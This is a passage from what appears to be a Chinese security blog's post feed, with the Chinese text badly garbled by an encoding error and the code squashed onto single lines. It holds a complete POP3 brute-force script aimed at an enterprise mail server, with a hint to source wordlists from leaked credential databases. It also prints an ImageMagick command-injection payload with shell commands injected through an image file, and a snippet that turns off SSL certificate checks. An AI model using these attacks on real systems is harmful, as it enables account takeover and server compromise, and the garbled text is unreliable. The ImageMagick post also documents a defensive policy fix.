äº†(è¿˜æœ‰åä¸ªç½‘ç«™æ²¡æµ‹å‘¢ï¼Œæ”¿åºœç½‘ç«™çœŸæ˜¯å°¼ç›å•Šï¼Œè°æœ‰æ¯”è¾ƒå¥½çš„ç»éªŒæœ›å¤§ç‰›ä»¬ä¸ååˆ†äº«ï¼Œä¸è¯´äº†éƒ½æ˜¯æ³ªâ€¦) å‘é€é‚®ä»¶éƒ¨åˆ†ä¸»è¦ç”¨äº†smtplibå’Œemailåº“ï¼Œå…·ä½“ä»£ç ä¸ºï¼š12345to_list=[&apos;xxx@qq.com&apos;] #æ¥æ”¶é€šçŸ¥çš„é‚®ç®±mail_host = &apos;smtp.163.com&apos; #è®¾ç½®æœåŠ¡å™¨mail_user = &apos;xxx&apos; #æ›¿æ¢ä¸ºå‘ä»¶é‚®ç®±ç”¨æˆ·å,ä¸å¸¦@åé¢çš„mail_pass = &apos;xxx&apos; #æ›¿æ¢ä¸ºå‘ä»¶é‚®ç®±å£ä»¤mail_postfix = &apos;163.com&apos; #å‘ä»¶ç®±çš„åç¼€ 1msg = MIMEText(content,_subtype=&apos;plain&apos;,_charset=&apos;gb2312&apos;) ç¬¬ä¸€ä¸ªå‚æ•°å°±æ˜¯é‚®ä»¶æ­£æ–‡ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯MIMEçš„subtypeï¼Œä¼ å…¥â€™plainâ€™ï¼Œæœ€ç»ˆçš„MIMEå°±æ˜¯â€™text/plainâ€™ï¼Œæœ€åè®¾ç½®ç¼–ç ä¸ºgb2312ï¼Œä¸è¿‡ä¸ºäº†å…¼å®¹æ€§ï¼Œä½ å¯ä»¥ä½¿ç”¨utf-8ï¼Œå…·ä½“çš„è¿‡ç¨‹å‡½æ•°æˆ‘å°±ä¸è§£é‡Šäº†ã€‚ ä¿¡æ¯æŠ“å–éƒ¨åˆ†ï¼Œå¾ˆç®€å•å°±æ˜¯æŠŠæ•°æ®å˜ä¸ºæ•°ç»„ï¼Œä»æ•°ç»„ä¸­åŒ¹é…ä¿¡æ¯ã€‚è¿™é‡Œæˆ‘é‡åˆ°ä¸€ä¸ªé—®é¢˜ï¼šurllib2.URLError: &lt;urlopen error [SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:590)&gt;è¿™ä¸ªé”™è¯¯ä¿¡æ¯ä¸»è¦æ˜¯å› ä¸ºï¼šSSL: CERTIFICATE_VERIFY_FAILEDPython å‡çº§åˆ° 2.7.9 ä¹‹åå¼•å…¥äº†ä¸€ä¸ªæ–°ç‰¹æ€§ï¼Œå½“ä½¿ç”¨urllib.urlopenæ‰“å¼€ä¸€ä¸ª https é“¾æ¥æ—¶ï¼Œä¼šéªŒè¯ä¸€æ¬¡ SSL è¯ä¹¦ã€‚è€Œå½“ç›®æ ‡ç½‘ç«™ä½¿ç”¨çš„æ˜¯è‡ªç­¾åçš„è¯ä¹¦æ—¶å°±ä¼šæŠ›å‡ºä¸€ä¸ª urllib2.URLError: çš„é”™è¯¯æ¶ˆæ¯. è§£å†³æ–¹æ¡ˆï¼š1234import sslimport urllib2ssl._create_default_https_context = ssl._create_unverified_contextprint urllib2.urlopen(&quot;https://www.111cn.net/&quot;).read() é™„ï¼š smtpåè®®çš„åŸºæœ¬å‘½ä»¤åŒ…æ‹¬ï¼š123456789101112HELO å‘æœåŠ¡å™¨æ ‡è¯†ç”¨æˆ·èº«ä»½MAIL åˆå§‹åŒ–é‚®ä»¶ä¼ è¾“ mail from:RCPT æ ‡è¯†å•ä¸ªçš„é‚®ä»¶æ¥æ”¶äººï¼›å¸¸åœ¨MAILå‘½ä»¤åé¢,å¯æœ‰å¤šä¸ªrcpt to:DATA åœ¨å•ä¸ªæˆ–å¤šä¸ªRCPTå‘½ä»¤å,è¡¨ç¤ºæ‰€æœ‰çš„é‚®ä»¶æ¥æ”¶äººå·²æ ‡è¯†,å¹¶åˆå§‹åŒ–æ•°æ®ä¼ è¾“,ä»¥.ç»“æŸVRFY ç”¨äºéªŒè¯æŒ‡å®šçš„ç”¨æˆ·/é‚®ç®±æ˜¯å¦å­˜åœ¨ï¼›ç”±äºå®‰å…¨æ–¹é¢çš„åŸå› ,æœåŠ¡å™¨å¸¸ç¦æ­¢æ­¤å‘½ä»¤EXPN éªŒè¯ç»™å®šçš„é‚®ç®±åˆ—è¡¨æ˜¯å¦å­˜åœ¨,æ‰©å……é‚®ç®±åˆ—è¡¨,ä¹Ÿå¸¸è¢«ç¦ç”¨HELP æŸ¥è¯¢æœåŠ¡å™¨æ”¯æŒä»€ä¹ˆå‘½ä»¤NOOP æ— æ“ä½œ,æœåŠ¡å™¨åº”å“åº”OKQUIT ç»“æŸä¼šè¯RSET é‡ç½®ä¼šè¯,å½“å‰ä¼ è¾“è¢«å–æ¶ˆMAIL FROM æŒ‡å®šå‘é€è€…åœ°å€RCPT TO æŒ‡æ˜çš„æ¥æ”¶è€…åœ°å€ SMTPä¼šè¯çš„æµç¨‹ï¼š ehlo auth login mail from rcpt to data quit ä¸Šé¢è¯´çš„æ˜¯æœ€æ™®é€šçš„æƒ…å†µï¼Œä½†æ˜¯ç°åœ¨å¥½å¤šä¼ä¸šé‚®ä»¶éƒ½æ˜¯å®‰å…¨é‚®ä»¶çš„ï¼Œå°±æ˜¯é€šè¿‡SSLå‘é€çš„é‚®ä»¶ï¼Œè¿™ä¸ªæ€ä¹ˆå‘å‘¢ï¼ŸSMTPå¯¹SSLå®‰å…¨é‚®ä»¶çš„æ”¯æŒæœ‰ä¸¤ç§æ–¹æ¡ˆï¼Œä¸€ç§è€çš„æ˜¯ä¸“é—¨å¼€å¯ä¸€ä¸ª465ç«¯å£æ¥æ¥æ”¶sslé‚®ä»¶ï¼Œå¦ä¸€ç§æ›´æ–°çš„åšæ³•æ˜¯åœ¨æ ‡å‡†çš„25ç«¯å£çš„smtpä¸Šå¢åŠ ä¸€ä¸ªstarttlsçš„å‘½ä»¤æ¥æ”¯æŒã€‚ è¿™ä¸ªå¾ˆç®€å•ï¼Œsmtplibé‡Œå°±æœ‰è¿™ä¸ªæ–¹æ³•ï¼Œå«smtplib.starttls()ã€‚å½“ç„¶ï¼Œä¸æ˜¯æ‰€æœ‰çš„é‚®ä»¶ç³»ç»Ÿéƒ½æ”¯æŒå®‰å…¨é‚®ä»¶çš„ï¼Œè¿™ä¸ªéœ€è¦ä»ehloçš„è¿”å›å€¼é‡Œæ¥ç¡®è®¤ï¼Œå¦‚æœé‡Œé¢æœ‰starttlsï¼Œæ‰è¡¨ç¤ºæ”¯æŒã€‚ æ³¨æ„ï¼šä»¥ä¸Šçš„ä»£ç ä¸ºäº†æ–¹ä¾¿æˆ‘éƒ½æ²¡æœ‰åˆ¤æ–­è¿”å›å€¼ï¼Œä¸¥æ ¼è¯´æ¥ï¼Œæ˜¯åº”è¯¥åˆ¤æ–­ä¸€ä¸‹è¿”å›çš„ä»£ç çš„ï¼Œåœ¨smtpåè®®ä¸­ï¼Œåªæœ‰è¿”å›ä»£ç æ˜¯2xxæˆ–è€…3xxæ‰èƒ½ç»§ç»­ä¸‹ä¸€æ­¥ï¼Œè¿”å›4xxæˆ–5xxçš„ï¼Œéƒ½æ˜¯å‡ºé”™äº†ã€‚]]></content>
      <tags>
        <tag>ç¼–ç¨‹</tag>
        <tag>Python</tag>
        <tag>è‡ªåŠ¨åŒ–</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python é‚®ç®±çˆ†ç ´]]></title>
    <url>%2F2016%2F10%2F03%2FPython-%E9%82%AE%E7%AE%B1%E7%88%86%E7%A0%B4%2F</url>
    <content type="text"><![CDATA[æŒ‰ç…§å¸ˆå‚…ç»™çš„ä»»åŠ¡ï¼Œå†™äº†ä¸€ä¸ªä¼ä¸šé‚®ç®±çš„çˆ†ç ´è„šæœ¬ï¼Œåç»­è¿˜æœ‰FTP,SSHç­‰ä¸€äº›çˆ†ç ´çš„è„šæœ¬ã€‚ æˆ‘å…ˆè¯´ä¸‹æ•´ä½“æ€è·¯ï¼š æ€»ä½“å°±æ˜¯åˆ©ç”¨pythonçš„poplibæ¨¡å—æ¥ä»pop3æœåŠ¡å™¨ä¸Šäº¤äº’ï¼Œæ ¹æ®è·å–çš„ç›¸å…³ä¿¡æ¯ï¼Œäº§ç”Ÿç»“æœã€‚POP3åè®®å¹¶ä¸å¤æ‚ï¼Œå®ƒä¹Ÿæ˜¯é‡‡ç”¨çš„ä¸€é—®ä¸€ç­”å¼çš„æ–¹å¼ï¼Œä½ å‘æœåŠ¡å™¨å‘é€ä¸€ä¸ªå‘½ä»¤ï¼ŒæœåŠ¡å™¨å¿…ç„¶ä¼šå›å¤ä¸€ä¸ªä¿¡æ¯. é¦–å…ˆéªŒè¯å‚æ•°æ˜¯å¦æ­£ç¡®Sys.argv[]æ˜¯ç”¨æ¥è·å–å‘½ä»¤è¡Œå‚æ•°çš„ï¼Œsys.argv[0]è¡¨ç¤ºä»£ç æœ¬èº«æ–‡ä»¶è·¯å¾„ï¼Œæ‰€ä»¥å‚æ•°ä»1å¼€å§‹ ç„¶åä»ç”¨æˆ·å¯†ç æ–‡ä»¶ä¸­è¯»å–ä¿¡æ¯ pop.getwelcome()ç”¨æ¥è·å–è¿æ¥æœåŠ¡å™¨çš„å“åº”çŠ¶æ€ ç„¶åå°±æ˜¯è„šæœ¬çš„æ ¸å¿ƒä»£ç éƒ¨åˆ† 123456server = &quot;pop.qiye.163.com&quot; //è®¾ç½®pop3æœåŠ¡å™¨åœ°å€pop = poplib.POP3(server,110) //è¿æ¥pop3æœåŠ¡å™¨pop.user(user) //éªŒè¯ç”¨æˆ·åauth = pop.pass_(passwd) //éªŒè¯å¯†ç if auth.split(&apos; &apos;)[0]== &quot;+OK&quot;: //åˆ¤æ–­å“åº”çš„ç»“æœæ˜¯å¦â€œOKâ€ pring user,passwd æœ€åè¾“å‡ºå‡ºæ¥ç›¸å…³çš„ç”¨æˆ·ä¿¡æ¯ è„šæœ¬ä»£ç å¦‚ä¸‹ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485#!/usr/bin/python# -*- coding: UTF-8 -*-&apos;&apos;&apos;@Authorï¼šw2n1ck@åšå®¢ï¼šhttp://byd.dropsec.xyz/@Email Pop3 Brute Forcer&apos;&apos;&apos;import threading, time, random, sys, poplibfrom copy import copyif len(sys.argv) !=3: print &quot;\t --------------------------------------------------\n&quot; print &quot;\t Usage: ./Emailpopbrute.py &lt;userlist&gt; &lt;passlist&gt;\n&quot; sys.exit(1)server = &quot;pop.qiye.163.com&quot;success = []try: users = open(sys.argv[1], &quot;r&quot;).readlines()except(IOError): print &quot;[-] Error: urerlistæ‰“å¼€å¤±è´¥!\n&quot; sys.exit(1)try: words = open(sys.argv[2], &quot;r&quot;).readlines()except(IOError): print &quot;[-] Error: passlistæ‰“å¼€å¤±è´¥!\n&quot; sys.exit(1)try: pop = poplib.POP3(server,110) welcome = pop.getwelcome() print welcome pop.quit()except (poplib.error_proto): welcome = &quot;No Response&quot; passdef mailbruteforce(listuser,listpwd): if len(listuser) &lt; 1 or len(listpwd) &lt; 1 : print &quot;An error occurred: No user or pass list&quot; return 1 for user in listuser: for value in listpwd : user = user.replace(&quot;\n&quot;,&quot;&quot;) value = value.replace(&quot;\n&quot;,&quot;&quot;) try: print &quot;-&quot;*12 print &quot;[+] User:&quot;,user,&quot;Password:&quot;,value time.sleep(1) pop = poplib.POP3(server,110) pop.user(user) auth = pop.pass_(value) print auth if auth.split(&apos; &apos;)[0]!= &quot;+OK&quot; : pop.quit() print &quot;unknown error !&quot; continue if pop.stat()[1] is None or pop.stat()[1] &lt; 1 : pop.quit() print &quot;è·å–ä¿¡æ¯å¤±è´¥!&quot; continue ret = (user,value,pop.stat()[0],pop.stat()[1]) success.append(ret) pop.quit() break except: #print &quot;An error occurred:&quot;, msg passprint &quot;\t --------------------------------------------------\n&quot;print &quot;[+] Server:&quot;,serverprint &quot;[+] Port: 995&quot;print &quot;[+] Users Loaded:&quot;,len(users)print &quot;[+] Words Loaded:&quot;,len(words)print &quot;[+] Server response:&quot;,welcome,&quot;\n&quot;mailbruteforce(users,words)print &quot;\t[+] have weakpass :\t&quot;,len(success)if len(success) &gt;=1: for ret in success: print &quot;\n\n[+] Login successful:&quot;,ret[0], ret[1] print &quot;\t[+] Mail:&quot;,ret[2],&quot;emails&quot; print &quot;\t[+] Size:&quot;,ret[3],&quot;bytes\n&quot;print &quot;\n[-] Done&quot; æµ‹è¯•ç»“æœï¼š è¯´æ˜ï¼šç”¨æˆ·å­—å…¸æ–‡ä»¶éœ€è¦@domain.comï¼Œç±»ä¼¼zhangsan@domain.comã€lisi@domain.comã€wangwu@domain.comè¿™æ ·çš„ã€‚ç”±äºæˆ‘ä¹Ÿæ²¡æœ‰ä¼ä¸šé‚®ç®±çš„è´¦å·å¯†ç ï¼Œä¹Ÿå°±æ²¡æµ‹è¯•æˆåŠŸçš„ï¼Œè¦æ˜¯æ„Ÿå…´è¶£ï¼Œå¯ä»¥æœä¸€ä¸‹ç›¸å…³ç¤¾å·¥è£¤ã€‚ é™„ï¼š python ä¸­ os._exit()ï¼Œ sys.exit()ï¼Œ exit() çš„åŒºåˆ«æ˜¯ä»€ä¹ˆï¼Ÿ sys.exit(n) é€€å‡ºç¨‹åºå¼•å‘ä¸€ä¸ªSystemExitå¼‚å¸¸, å¯ä»¥æ•è·å¼‚å¸¸æ‰§è¡Œäº›æ¸…ç†å·¥ä½œ. né»˜è®¤å€¼ä¸º0, è¡¨ç¤ºæ­£å¸¸é€€å‡º. å…¶ä»–éƒ½æ˜¯éæ­£å¸¸é€€å‡º. æ²¡æœ‰æ•è·è¿™ä¸ªå¼‚å¸¸ï¼Œä¼šç›´æ¥é€€å‡ºï¼›æ•è·è¿™ä¸ªå¼‚å¸¸å¯ä»¥åšä¸€äº›é¢å¤–çš„æ¸…ç†å·¥ä½œã€‚ ä¸€èˆ¬ä¸»ç¨‹åºä¸­ä½¿ç”¨æ­¤é€€å‡º os._exit(n), ç›´æ¥é€€å‡º Python è§£é‡Šå™¨ï¼Œå…¶åçš„ä»£ç éƒ½ä¸æ‰§è¡Œ, ä¸æŠ›å¼‚å¸¸, ä¸æ‰§è¡Œç›¸å…³æ¸…ç†å·¥ä½œ. å¸¸ç”¨åœ¨å­è¿›ç¨‹çš„é€€å‡º. exit() è·Ÿ C è¯­è¨€ç­‰å…¶ä»–è¯­è¨€çš„ exit() åº”è¯¥æ˜¯ä¸€æ ·çš„ pop3æ”¶å–é‚®ä»¶çš„è¿‡ç¨‹ä¸€èˆ¬æ˜¯: è¿æ¥pop3æœåŠ¡å™¨ (poplib.POP3.__init__) å‘é€ç”¨æˆ·åå’Œå¯†ç è¿›è¡ŒéªŒè¯ (poplib.POP3.user poplib.POP3.pass_) è·å–é‚®ç®±ä¸­ä¿¡ä»¶ä¿¡æ¯ (poplib.POP3.stat) æ”¶å–é‚®ä»¶ (poplib.POP3.retr) åˆ é™¤é‚®ä»¶ (poplib.POP3.dele) é€€å‡º (poplib.POP3.quit) 1234567891011121314å‘½ä»¤ poplibæ–¹æ³• å‚æ•° çŠ¶æ€ æè¿°-----------------------------------------------------------------------------------------------USER user username è®¤å¯ ç”¨æˆ·åï¼Œæ­¤å‘½ä»¤ä¸ä¸‹é¢çš„passå‘½ä»¤è‹¥æˆåŠŸï¼Œå°†å¯¼è‡´çŠ¶æ€è½¬æ¢PASS pass_ password è®¤å¯ ç”¨æˆ·å¯†ç  APOP apop Name,Digest è®¤å¯ Digestæ˜¯MD5æ¶ˆæ¯æ‘˜è¦-----------------------------------------------------------------------------------------------STAT stat None å¤„ç† è¯·æ±‚æœåŠ¡å™¨å‘å›å…³äºé‚®ç®±çš„ç»Ÿè®¡èµ„æ–™ï¼Œå¦‚é‚®ä»¶æ€»æ•°å’Œæ€»å­—èŠ‚æ•°UIDL uidl [Msg#] å¤„ç† è¿”å›é‚®ä»¶çš„å”¯ä¸€æ ‡è¯†ç¬¦ï¼ŒPOP3ä¼šè¯çš„æ¯ä¸ªæ ‡è¯†ç¬¦éƒ½å°†æ˜¯å”¯ä¸€çš„LIST list [Msg#] å¤„ç† è¿”å›é‚®ä»¶æ•°é‡å’Œæ¯ä¸ªé‚®ä»¶çš„å¤§å°RETR retr [Msg#] å¤„ç† è¿”å›ç”±å‚æ•°æ ‡è¯†çš„é‚®ä»¶çš„å…¨éƒ¨æ–‡æœ¬DELE dele [Msg#] å¤„ç† æœåŠ¡å™¨å°†ç”±å‚æ•°æ ‡è¯†çš„é‚®ä»¶æ ‡è®°ä¸ºåˆ é™¤ï¼Œç”±quitå‘½ä»¤æ‰§è¡ŒRSET rset None å¤„ç† æœåŠ¡å™¨å°†é‡ç½®æ‰€æœ‰æ ‡è®°ä¸ºåˆ é™¤çš„é‚®ä»¶ï¼Œç”¨äºæ’¤æ¶ˆDELEå‘½ä»¤TOP top [Msg#] å¤„ç† æœåŠ¡å™¨å°†è¿”å›ç”±å‚æ•°æ ‡è¯†çš„é‚®ä»¶å‰nè¡Œå†…å®¹ï¼Œnå¿…é¡»æ˜¯æ­£æ•´æ•°NOOP noop None å¤„ç† æœåŠ¡å™¨è¿”å›ä¸€ä¸ªè‚¯å®šçš„å“åº”]]></content>
      <tags>
        <tag>çˆ†ç ´</tag>
        <tag>æ¸—é€æµ‹è¯•</tag>
        <tag>ç¼–ç¨‹</tag>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ImageMagickå‘½ä»¤æ‰§è¡Œæ¼æ´æµ…æ]]></title>
    <url>%2F2016%2F10%2F02%2FImageMagick%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90%2F</url>
    <content type="text"><![CDATA[0x00 å‰è¨€ä»€ä¹ˆæ˜¯ImageMagickï¼ŸImageMagickæ˜¯ä¸€ä¸ªåŠŸèƒ½å¼ºå¤§çš„å¼€æºå›¾å½¢å¤„ç†è½¯ä»¶,å¯ä»¥ç”¨æ¥è¯»ã€å†™å’Œå¤„ç†è¶…è¿‡90ç§çš„å›¾ç‰‡æ–‡ä»¶,åŒ…æ‹¬æµè¡Œçš„JPEGã€GIFã€ PNGã€PDFä»¥åŠPhotoCDç­‰æ ¼å¼ã€‚ä½¿ç”¨å®ƒå¯ä»¥å¯¹å›¾ç‰‡è¿›è¡Œåˆ‡å‰²ã€æ—‹è½¬ã€ç»„åˆç­‰å¤šç§ç‰¹æ•ˆçš„å¤„ç†ã€‚ç”±äºå…¶åŠŸèƒ½å¼ºå¤§ã€æ€§èƒ½è¾ƒå¥½,å¹¶ä¸”å¯¹å¾ˆå¤šè¯­è¨€éƒ½æœ‰æ‹“å±•æ”¯æŒ,æ‰€ä»¥åœ¨ç¨‹åºå¼€å‘ä¸­è¢«å¹¿æ³›ä½¿ç”¨ã€‚è®¸å¤šç½‘ç«™å¼€å‘è€…å–œçˆ±ä½¿ç”¨ImageMagickæ‹“å±•æ¥åšwebä¸Šçš„å›¾ç‰‡å¤„ç†å·¥ä½œ,æ¯”å¦‚ç”¨æˆ·å¤´åƒç”Ÿæˆã€å›¾ç‰‡ç¼–è¾‘ç­‰ã€‚ 0x01 æ¼æ´æè¿°ImageMagickæ˜¯ä¸€æ¬¾å¼€æºå›¾ç‰‡å¤„ç†åº“ï¼Œæ”¯æŒPHPã€Rubyã€NodeJSå’ŒPythonç­‰å¤šç§è¯­è¨€ï¼Œä½¿ç”¨éå¸¸å¹¿æ³›ã€‚åŒ…æ‹¬PHP imagickã€Ruby rmagickå’Œpaperclipä»¥åŠNodeJS imagemagickç­‰å¤šä¸ªå›¾ç‰‡å¤„ç†æ’ä»¶éƒ½ä¾èµ–å®ƒè¿è¡Œã€‚å½“æ”»å‡»è€…æ„é€ å«æœ‰æ¶æ„ä»£ç å¾—å›¾ç‰‡æ—¶ï¼ŒImageMagickåº“å¯¹äºHTTPPSæ–‡ä»¶å¤„ç†ä¸å½“ï¼Œæ²¡æœ‰åšä»»ä½•è¿‡æ»¤ï¼Œå¯è¿œç¨‹å®ç°è¿œç¨‹å‘½ä»¤æ‰§è¡Œï¼Œè¿›è€Œå¯èƒ½æ§åˆ¶æœåŠ¡å™¨ã€‚ 0x02 å½±å“ç¨‹åº¦æ”»å‡»æˆæœ¬ï¼šä½ å±å®³ç¨‹åº¦ï¼šé«˜ å½±å“èŒƒå›´ï¼šImageMagick 6.9.3-9ä»¥å‰çš„æ‰€æœ‰ç‰ˆæœ¬ 0x03 æ¼æ´åˆ†æå‘½ä»¤æ‰§è¡Œæ¼æ´æ˜¯å‡ºåœ¨ImageMagickå¯¹httpså½¢å¼çš„æ–‡ä»¶å¤„ç†çš„è¿‡ç¨‹ä¸­ã€‚ ImageMagickä¹‹æ‰€ä»¥æ”¯æŒé‚£ä¹ˆå¤šçš„æ–‡ä»¶æ ¼å¼,æ˜¯å› ä¸ºå®ƒå†…ç½®äº†éå¸¸å¤šçš„å›¾åƒå¤„ç†åº“,å¯¹äºè¿™äº›å›¾åƒå¤„ç†åº“,ImageMagickç»™å®ƒèµ·äº†ä¸ªåå­—å«åšâ€Delegateâ€(å§”æ‰˜),æ¯ä¸ªDelegateå¯¹åº”ä¸€ç§æ ¼å¼çš„æ–‡ä»¶,ç„¶åé€šè¿‡ç³»ç»Ÿçš„system()å‘½ä»¤æ¥è°ƒç”¨å¤–éƒ¨çš„libè¿›è¡Œå¤„ç†ã€‚è°ƒç”¨å¤–éƒ¨libçš„è¿‡ç¨‹æ˜¯ä½¿ç”¨ç³»ç»Ÿçš„systemå‘½ä»¤æ¥æ‰§è¡Œçš„ï¼Œå¯¼è‡´å‘½ä»¤æ‰§è¡Œçš„ä»£ç ã€‚ ImageMagickå§”æ‰˜çš„é»˜è®¤é…ç½®æ–‡ä»¶ï¼š /etc/ImageMagick/delegates.xml å…·ä½“ä»£ç è¯·å‚è€ƒï¼šGithub-ImageMagick æˆ‘ä»¬å®šä½åˆ°httpså§”æ‰˜å¾—é‚£ä¸€è¡Œï¼š1&quot; &lt;delegate decode=\&quot;https\&quot; command=\&quot;&amp;quot;wget&amp;quot; -q -O &amp;quot;%o&amp;quot; &amp;quot;https:%M&amp;quot;\&quot;/&gt;&quot; å¯ä»¥çœ‹åˆ°ï¼Œcommandå®šä¹‰äº†å®ƒå¯¹äºhttpsæ–‡ä»¶å¤„ç†æ—¶å¸¦å…¥system()å‡½æ•°å¾—å‘½ä»¤ï¼š&quot;wget&quot; -q -O &quot;%o&quot; &quot;https:%M&quot;ã€‚ wgetæ˜¯ä»ç½‘ç»œä¸‹è½½æ–‡ä»¶å¾—å‘½ä»¤ï¼Œ%Mæ˜¯ä¸€ä¸ªå ä½ç¬¦ï¼Œå®ƒå¾—å…·ä½“å®šä¹‰åœ¨é…ç½®æ–‡ä»¶ä¸­å¦‚ä¸‹ï¼š123456789101112131415161718%i input image filename %o output image filename %u unique temporary filename %Z unique temporary filename %# input image signature %b image file size %c input image comment %g image geometry %h image rows (height) %k input image number colors %l image label %m input image format %p page number %q input image depth %s scene number %w image columns (width) %x input image x resolution %y input image y resolution å¯ä»¥çœ‹åˆ°%mè¢«å®šä¹‰ä¸ºè¾“å…¥çš„å›¾ç‰‡æ ¼å¼,ä¹Ÿå°±æ˜¯æˆ‘ä»¬è¾“å…¥çš„urlåœ°å€ã€‚ä½†æ˜¯ç”±äºåªæ˜¯åšäº†ç®€å•çš„å­—ç¬¦ä¸²æ‹¼æ¥,æ²¡æœ‰åšä»»ä½•è¿‡æ»¤ï¼Œç›´æ¥æ‹¼æ¥åˆ°commandå‘½ä»¤ä¸­ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥å°†å¼•å·é—­åˆåé€šè¿‡&quot;|&quot;,â€`â€,â€&amp;â€ç­‰å¸¦å…¥å…¶ä»–å‘½ä»¤,ä¹Ÿå°±å½¢æˆäº†å‘½ä»¤æ³¨å…¥ã€‚ æ¯”å¦‚æˆ‘ä»¬ä¼ å…¥å¦‚ä¸‹ä»£ç ï¼š https://test.com&quot;|ls â€œ-al åˆ™å®é™…å¾—systemå‡½æ•°æ‰§è¡Œå¾—å‘½ä»¤ä¸ºï¼š â€œwgetâ€ -q -O â€œ%oâ€ â€œ https://test.com&quot;|ls â€œ-alâ€ è¿™æ ·ï¼Œls -alå‘½ä»¤æˆåŠŸæ‰§è¡Œã€‚ 0x04 æ¼æ´åˆ©ç”¨è¿™ä¸ªæ¼æ´å¾—pocç”±è€å¤–ç»™å‡ºå¾—ï¼Œå¦‚ä¸‹ï¼š1234push graphic-contextviewbox 0 0 640 480fill &apos;url(https://&quot;|id; &quot;)&apos;pop graphic-context pushå’Œpopæ˜¯ç”¨äºå †æ ˆçš„æ“ä½œï¼Œä¸€ä¸ªè¿›æ ˆï¼Œä¸€ä¸ªå‡ºæ ˆ; viewboxæ˜¯è¡¨ç¤ºSVGå¯è§åŒºåŸŸçš„å¤§å°ï¼Œæˆ–è€…å¯ä»¥æƒ³è±¡æˆèˆå°å¤§å°ï¼Œç”»å¸ƒå¤§å°ã€‚ç®€å•ç†è§£å°±æ˜¯æ ¹æ®åé¢å¾—å‚æ•°é€‰å–å…¶ä¸­å¾—ä¸€éƒ¨åˆ†ç”»é¢; fill url()æ˜¯æŠŠå›¾ç‰‡å¡«å……åˆ°å½“å‰å…ƒç´ å†…; åœ¨å…¶ä¸­æˆ‘ä»¬ä½¿ç”¨äº†fill url()çš„å½¢å¼è°ƒç”¨å­˜åœ¨æ¼æ´çš„https delegate,å½“ImageMagickå»å¤„ç†è¿™ä¸ªæ–‡ä»¶æ—¶,æ¼æ´å°±ä¼šè¢«è§¦å‘ã€‚ é™„ï¼šImageMagické»˜è®¤æ”¯æŒä¸€ç§å›¾ç‰‡æ ¼å¼ï¼Œå«mvgï¼Œè€Œmvgä¸svgæ ¼å¼ç±»ä¼¼ï¼Œå…¶ä¸­æ˜¯ä»¥æ–‡æœ¬å½¢å¼å†™å…¥çŸ¢é‡å›¾çš„å†…å®¹ï¼Œå…è®¸åœ¨å…¶ä¸­åŠ è½½ImageMagickä¸­å…¶ä»–çš„delegate(æ¯”å¦‚å­˜åœ¨æ¼æ´çš„https delegate)ã€‚å¹¶ä¸”åœ¨å›¾å½¢å¤„ç†çš„è¿‡ç¨‹ä¸­,ImageMagickä¼šè‡ªåŠ¨æ ¹æ®å…¶å†…å®¹è¿›è¡Œå¤„ç†,ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬å¯ä»¥å°†æ–‡ä»¶éšæ„å®šä¹‰ä¸ºpngã€jpgç­‰ç½‘ç«™ä¸Šä¼ å…è®¸çš„æ ¼å¼,è¿™å¤§å¤§å¢åŠ äº†æ¼æ´çš„å¯åˆ©ç”¨åœºæ™¯ã€‚ åˆ©ç”¨è¿‡ç¨‹ï¼š åˆ›å»ºä¸€ä¸ªexploit.pngæ–‡ä»¶ï¼ŒåŒ…å«ä»¥ä¸‹å†…å®¹ï¼š 1234push graphic-contextviewbox 0 0 640 480fill &apos;url(https://test.com/image.jpg&quot;|ls &quot;-al)&apos;pop graphic-context æ‰§è¡Œå‘½ä»¤ï¼šconvert exploit.png 1.png(åé¢çš„æ˜¯convertçš„å‚æ•°) 0x05 æ¼æ´ä¿®å¤ å‡çº§åˆ°æœ€æ–°ç‰ˆæœ¬ é…ç½®/etc/ImageMagick/policy.xmlçš„æ–¹å¼æ¥ç¦æ­¢httpsã€mvgè¿™äº›delegate,æˆ–è€…ç›´æ¥åœ¨é…ç½®æ–‡ä»¶åˆ é™¤ç›¸åº”çš„delegate 1234567&lt;policymap&gt; &lt;policy domain=&quot;coder&quot; rights=&quot;none&quot; pattern=&quot;EPHEMERAL&quot; /&gt; &lt;policy domain=&quot;coder&quot; rights=&quot;none&quot; pattern=&quot;URL&quot; /&gt; &lt;policy domain=&quot;coder&quot; rights=&quot;none&quot; pattern=&quot;HTTPS&quot; /&gt; &lt;policy domain=&quot;coder&quot; rights=&quot;none&quot; pattern=&quot;MVG&quot; /&gt; &lt;policy domain=&quot;coder&quot; rights=&quot;none&quot; pattern=&quot;MSL&quot; /&gt;&lt;/policymap&gt;]]></content>
      <tags>
        <tag>æ¸—é€æµ‹è¯•</tag>
        <tag>ææƒ</tag>
        <tag>å‘½ä»¤æ‰§è¡Œ</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Zabbix SQLæ³¨å…¥,ç»•è¿‡ç™»é™†]]></title>
    <url>%2F2016%2F09%2F23%2FZabbix-SQL%E6%B3%A8%E5%85%A5-%E7%BB%95%E8%BF%87%E7%99%BB%E9%99%86%2F</url>
